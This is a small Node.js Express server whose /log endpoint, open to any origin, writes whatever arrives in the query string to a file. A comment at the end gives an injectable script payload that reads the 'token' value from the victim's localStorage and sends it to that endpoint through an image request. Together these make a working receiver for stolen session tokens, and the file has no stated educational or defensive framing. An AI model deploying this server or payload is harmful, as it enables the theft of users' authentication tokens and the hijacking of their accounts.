const express = require('express');
const fs = require('fs');
const app = express();
const port = 3000;
const cors = require('cors')

app.use(express.json());
app.use(express.urlencoded());
app.use(cors({
    origin: '*'
}))

app.use('/public', express.static('public'));

app.get('/log', (req, res) => {
  const logMessage = req.query.message || 'No message provided';
  // url query string /log?message=this is input
  // Save the log message to a file
  fs.appendFile('log.txt', logMessage + '\n', (err) => {
    if (err) {
      console.error('Error writing to log file:', err);
      return res.status(500).send('Error saving log');
    }
    console.log('Log saved:', logMessage);
    res.send('Log saved');
  });
});

app.listen(port, () => {
  console.log(`App listening at http://localhost:${port}`);
});

// <script>var i=new Image; i.src="http://localhost:3000/log?message="+localStorage.getItem("token"); </script>